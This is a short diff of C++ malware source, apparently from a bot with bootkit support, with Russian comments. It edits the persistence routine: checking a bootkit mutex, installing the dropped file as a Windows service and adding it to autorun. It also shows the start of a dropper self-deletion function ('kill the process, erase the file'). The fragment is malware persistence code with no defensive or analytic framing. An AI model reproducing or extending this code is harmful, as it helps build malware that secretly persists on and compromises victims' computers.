@@ -93,26 +93,25 @@ void InternalAddToAutorun()
 	#ifndef DEBUGBOT
 		const static char ButkitMutex[] = {'b', 'k', 't', 'r', 'u', 'e',  0};
 		HANDLE Mutex = (HANDLE)pOpenMutexA(SYNCHRONIZE, TRUE, (PCHAR)ButkitMutex);
-		if (Mutex != NULL)
+		if (Mutex)
 		{
-			if (Mutex != NULL)
-			{
-				pCloseHandle(Mutex);
-				MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
-				return;
-			}
+			pCloseHandle(Mutex);
+			MDBG("Main", "Буткит установлен. Игнорируем добавление в автозагрузку.");
+			return;
 		}
 
 		bool ServiceInstalled = false;
 		if (!WSTR::IsEmpty(TempFileName))
 		{
 				PCHAR Name = WSTR::ToAnsi(TempFileName, 0);
-				BOT::AddToAutoRun(Name);
+
 				BOT::InstallService(Name);
+				BOT::AddToAutoRun(Name);
 				STR::Free(Name);
 		}
 	#endif
 }
+
 
 void DeleteDropper() // убиваем процесс, стираем файл
 {
